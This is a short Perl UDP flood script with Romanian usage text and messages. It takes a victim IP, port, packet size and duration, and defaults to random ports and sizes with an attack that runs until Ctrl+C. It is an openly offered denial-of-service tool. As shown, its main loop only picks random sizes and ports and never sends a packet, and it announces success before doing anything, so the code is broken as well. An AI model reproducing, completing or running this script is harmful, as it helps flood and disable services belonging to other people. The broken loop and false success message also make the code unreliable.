#!/usr/bin/perl
#DoS Script Perl [Romanian Version]
use Socket;
use strict;

if($#ARGV != 3) {
 print " Comanda este: perl perldos <ip> <port> <size> <time> \n\n"; 
 print " port=0 port random\n";
 print " size=0 trimite pachete cu marimea intre 64 si 1024\n"; 
 print " time=0 atac continuu pana la ctrl+c\n";
 exit(1); 
} 

my ($ip,$port,$size,$time) = @ARGV; 

my ($iaddr,$endtime,$psize,$pport); 

$iaddr = inet_aton("$ip") or die "Adresa ip gresita. Corecteaza: $ip\n"; 
$endtime = time() + ($time ? $time : 100); 
socket(flood, PF_INET, SOCK_DGRAM, 17); 

print <<EOTEXT;
Atacul a fost trimis cu succes.
EOTEXT
print "Pentru a opri atacul apasa ctrl+c.\n"; 

for (;time() <= $endtime;) { 
  $psize = $size ? $size : int(rand(1024-64)+64) ; 
  $pport = $port ? $port : int(rand(65500))+1; 
  }